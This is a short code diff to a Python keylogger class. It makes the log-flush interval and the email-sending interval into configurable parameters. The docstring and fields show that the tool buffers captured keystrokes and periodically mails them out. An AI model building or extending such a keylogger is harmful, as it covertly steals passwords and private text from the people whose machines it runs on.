@@ -13,15 +13,15 @@ class KeyLogger:
     mem: string buffer to minimize logging writeouts
     start_time: time of the current logging cycle
     """
-    def __init__(self, mail, log_dir=""):
+    def __init__(self, mail, email_st=120, log_ft=20, log_dir=""):
         # email obj
         self.email = mail
 
         # times for last updates
         self.start_time = time.time()
         self.email_time = self.start_time
-        self.log_flush_time = 10 # seconds until log flush
-        self.email_send_time = 12 # seconds until email sent
+        self.log_flush_time = log_ft # seconds until log flush
+        self.email_send_time = email_st # seconds until email sent
 
         # buffer and logging config
         self.mem = []
